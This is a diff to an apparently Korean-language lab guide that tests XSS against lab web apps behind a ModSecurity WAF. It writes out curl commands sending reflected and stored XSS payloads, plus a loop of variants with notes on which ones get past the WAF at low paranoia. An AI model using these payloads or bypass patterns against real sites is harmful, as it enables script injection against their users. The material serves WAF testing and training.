@@ -96,23 +96,54 @@ XSS hook script 를 통해 피해자 브라우저 제어.
 
 ### 1 — Reflected XSS 시도
 
-```
-ssh 6v6-attacker "curl -s -o /dev/null -w '%{http_code}\n' -H 'Host: juice.6v6.lab' 'http://10.20.30.1/?q=<script>alert(1)</script>'"
+```bash
+# Reflected XSS — URL 파라미터의 값이 응답에 그대로 반영
+#   query string 의 <script> 가 HTML 응답에 escape 없이 들어가면 실행
+#   ModSec 941 (libinjection-XSS) 가 매치하여 403 차단 예상
+#   응답 코드:
+#     200 = 차단 안 됨 (XSS 가능 — 잘못된 paranoia 설정)
+#     403 = ModSec 차단 (정상 방어)
+ssh 6v6-attacker "curl -s -o /dev/null -w '%{http_code}\n' \
+    -H 'Host: juice.6v6.lab' \
+    'http://10.20.30.1/?q=<script>alert(1)</script>'"
 ```
 
 ### 2 — Stored XSS (mediforum)
 
-```
-ssh 6v6-attacker "curl -s -X POST -d 'comment=<script>alert(1)</script>' -H 'Host: mediforum.6v6.lab' http://10.20.30.1/comments"
+```bash
+# Stored XSS — 서버 DB 에 저장 → 모든 방문자에 영향
+#   POST body 에 <script> → comment 로 DB 저장
+#   다음 방문자가 comment 페이지 열면 XSS 실행
+#   - mediforum 은 의료 forum 모사 → 의사/환자 모두 영향 가정
+ssh 6v6-attacker "curl -s -X POST \
+    -d 'comment=<script>alert(1)</script>' \
+    -H 'Host: mediforum.6v6.lab' \
+    http://10.20.30.1/comments"
+# 운영 측 detection: ModSec audit log 의 941xxx + Wazuh agent ingest
 ```
 
 ### 3 — payload 6 변형 시도
 
-```
-for p in '<script>alert(1)</script>' '<img src=x onerror=alert(1)>' '<svg onload=alert(1)>' '<iframe src=javascript:alert(1)>'; do
-    code=$(ssh 6v6-attacker "curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' \"http://10.20.30.1/?q=$p\"")
+```bash
+# 다양한 XSS payload — script tag 차단 시 다른 우회 패턴
+#   <script>: 기본 (대부분 ModSec 차단)
+#   <img onerror>: img 태그의 error 이벤트 (script 없이 JS 실행)
+#   <svg onload>: SVG 의 load 이벤트
+#   <iframe src=javascript:>: iframe 의 JS scheme
+#   각 응답 코드 → ModSec 의 paranoia level 효과 분석
+for p in '<script>alert(1)</script>' \
+         '<img src=x onerror=alert(1)>' \
+         '<svg onload=alert(1)>' \
+         '<iframe src=javascript:alert(1)>'; do
+    code=$(ssh 6v6-attacker "curl -s -o /dev/null -w '%{http_code}' \
+        -H 'Host: juice.6v6.lab' \"http://10.20.30.1/?q=$p\"")
     echo "$code $p"
 done
+# 예상 출력 (paranoia 1 기준):
+#   403 <script>...        ← libinjection 매치
+#   403 <img ...           ← event handler 매치
+#   403 <svg ...           ← event handler 매치
+#   200 <iframe javascript:  ← 일부 우회 가능 (paranoia 2+ 권장)
 ```
 
 ### 4 — ModSec 941 audit log
